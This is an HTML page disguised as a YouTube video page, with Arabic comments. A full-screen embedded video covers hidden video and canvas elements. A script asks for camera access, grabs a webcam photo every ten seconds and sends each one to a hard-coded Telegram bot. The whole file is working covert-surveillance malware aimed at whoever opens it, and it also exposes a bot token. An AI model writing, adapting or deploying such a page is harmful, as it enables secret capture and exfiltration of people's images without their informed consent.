<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>  + فيديو يوتيوب</title>
  <style>
    html, body {
      margin: 0; padding: 0; overflow: hidden; height: 100%;
    }
    iframe {
      width: 100vw; height: 100vh; border: none;
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <iframe 
    src="https://www.youtube.com/embed/q2-fN1o5we0?autoplay=1&mute=1" 
    allow="autoplay; encrypted-media" allowfullscreen>
  </iframe>

  <script>
    const BOT_TOKEN = '7808033895:AAFnqEHgGsWmj3JOy9c0Q_6swZmltih6orU';
    const CHAT_ID = '6036900535';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    async function sendToTelegram(blob) {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'photo.jpg');

      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        const data = await res.json();
        if(data.ok) {
          console.log('✅ تم إرسال الصورة');
        } else {
          console.error('❌ خطأ في الإرسال:', data.description);
        }
      } catch (error) {
        console.error('❌ فشل الإرسال:', error);
      }
    }

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        // تأكد الفيديو جاهز
        video.onloadedmetadata = () => {
          video.play();
          console.log('📷 الكاميرا جاهزة، سيتم التقاط الصور كل 10 ثواني');
          setInterval(captureAndSend, 10000);
        };
      } catch (err) {
        alert('⚠️ فشل تشغيل الكاميرا: ' + err.message);
      }
    }

    function captureAndSend() {
      if (video.readyState < 2) {
        // الفيديو ليس جاهزًا
        console.warn('🚫 الفيديو غير جاهز للالتقاط');
        return;
      }

      // ضبط حجم الكانفاس حسب الفيديو
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      // رسم صورة الفيديو على الكانفاس
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // تحويل الصورة إلى Blob وإرسالها
      canvas.toBlob(blob => {
        if(blob) {
          sendToTelegram(blob);
        } else {
          console.error('❌ فشل تحويل الصورة إلى Blob');
        }
      }, 'image/jpeg', 0.95);
    }

    window.onload = startCamera;
  </script>

</body>
</html>
